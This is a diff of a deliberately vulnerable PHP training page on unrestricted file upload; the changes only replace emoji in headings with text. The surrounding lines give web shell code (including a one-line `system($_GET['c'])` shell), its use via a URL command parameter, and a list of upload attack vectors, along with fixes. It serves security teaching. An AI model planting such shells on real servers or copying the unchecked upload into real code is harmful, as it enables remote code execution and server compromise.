@@ -80,14 +80,14 @@ if(is_dir($upload_dir)) {
 </head>
 <body>
     <div class="warning-banner">
-        ⚠️ VULNERABLE VERSION - FOR SECURITY TRAINING ONLY ⚠️
+        WARNING: VULNERABLE VERSION - FOR SECURITY TRAINING ONLY WARNING:
     </div>
     
     <div class="container">
         <div class="row">
             <div class="col-md-10 offset-md-1">
                 <div class="vulnerability-info">
-                    <h5>🎯 Training Target: Unrestricted File Upload</h5>
+                    <h5>TARGET: Training Target: Unrestricted File Upload</h5>
                     <p><strong>Vulnerabilities Present:</strong></p>
                     <ul>
                         <li>No file type/extension validation</li>
@@ -151,7 +151,7 @@ if(is_dir($upload_dir)) {
                 <?php endif; ?>
 
                 <div class="vulnerability-info">
-                    <h6>💡 Learning Points:</h6>
+                    <h6>TIP: Learning Points:</h6>
                     <ol>
                         <li>No validation of file extensions or types</li>
                         <li>Files can be directly accessed via URL</li>
@@ -160,7 +160,7 @@ if(is_dir($upload_dir)) {
                         <li>Directory listing might be possible</li>
                     </ol>
                     
-                    <h6>🔍 Creating a PHP Web Shell:</h6>
+                    <h6>SEARCH: Creating a PHP Web Shell:</h6>
                     <p>Create a file named <code>shell.php</code> with this content:</p>
                     <pre>&lt;?php
 // Simple web shell
@@ -177,7 +177,7 @@ if(isset($_GET['cmd'])) {
                     
                     <p>After uploading, access: <code>uploads/shell.php?cmd=whoami</code></p>
                     
-                    <h6>🎯 Other Attack Vectors:</h6>
+                    <h6>TARGET: Other Attack Vectors:</h6>
                     <pre>1. PHP Web Shell: Complete remote code execution
 2. .htaccess Upload: Change Apache configuration
 3. Image with embedded PHP: Bypass weak filters
@@ -186,7 +186,7 @@ if(isset($_GET['cmd'])) {
 6. SVG with XSS: XSS in image files
 7. Path Traversal: ../../../etc/passwd overwrite</pre>
                     
-                    <h6>🛡️ How to Fix:</h6>
+                    <h6>FIX: How to Fix:</h6>
                     <pre>1. Whitelist allowed file extensions
    $allowed = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
@@ -219,7 +219,7 @@ if(isset($_GET['cmd'])) {
                 </div>
 
                 <div class="vulnerability-info mt-3">
-                    <h6>⚠️ Real-World Impact:</h6>
+                    <h6>WARNING: Real-World Impact:</h6>
                     <ul>
                         <li><strong>Remote Code Execution:</strong> Full server compromise via web shell</li>
                         <li><strong>Data Breach:</strong> Access to sensitive files and databases</li>
@@ -232,7 +232,7 @@ if(isset($_GET['cmd'])) {
                 </div>
 
                 <div class="vulnerability-info mt-3">
-                    <h6>📝 Example Web Shells:</h6>
+                    <h6>NOTE: Example Web Shells:</h6>
                     <p><strong>Minimal PHP Shell:</strong></p>
                     <pre>&lt;?php system($_GET['c']); ?&gt;</pre>
                     
